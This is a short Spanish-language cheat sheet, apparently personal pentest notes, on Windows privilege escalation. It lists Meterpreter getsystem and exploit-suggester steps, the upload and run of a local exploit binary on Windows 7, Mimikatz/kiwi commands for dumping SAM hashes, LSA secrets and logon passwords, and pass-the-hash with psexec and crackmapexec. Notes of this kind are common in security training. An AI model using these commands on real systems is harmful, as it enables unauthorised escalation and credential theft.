# Escalación de Privilegios en Windows

## Descripción
La escalación de privilegios en sistemas Windows es un proceso mediante el cual un atacante busca obtener acceso a niveles superiores de autoridad o control en un sistema comprometido. Esto puede permitir al atacante ejecutar comandos con derechos de administrador u otros niveles de acceso privilegiado.

### Automatizado

```python
getsystem(aveces funciona, es propio de meterpreter)
multi/recon/local_exploit_suggester (previamente una sesion de meterpreter, menciona que exploit podemos usar para elevar privilegios)
```

### Manual

```python
./windows-exploit-suggester.py –update
./windows-exploit-suggester.py –database 2021-12-26-mssb.xls –systeminfo win7.txt (este archivo tiene la info, con meterpreter sacas la info con sysinfo o systeminfo).
en meterprete subimos el exploit que nos dice que podemos usar
upload /downloads/41015.exe
./41015.exe 7 (por que es windows 7)
```


#### DUMP HASH 

```python
Mimikatz: https://github.com/gentilkiwi/mimikatz (volcar hash en un sistema windows)
Tambien viene incorporado en metasploit
load wiki (command meterpreter session)
creds_all 
? (ver todos los comandos utiles de kiwi)
lsa_dump_sam (obtenemos todos los hash)
si usamos la herramienta los comandos son:
privilege::debug (para ver si tenemos permisos '20')
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords (ver si hay password texto claro)

lsa_dump_sam
lsa_dump_secrets
probemos el psexec de metasploit para logearnos con un hash NTLM y también con crackmap
```
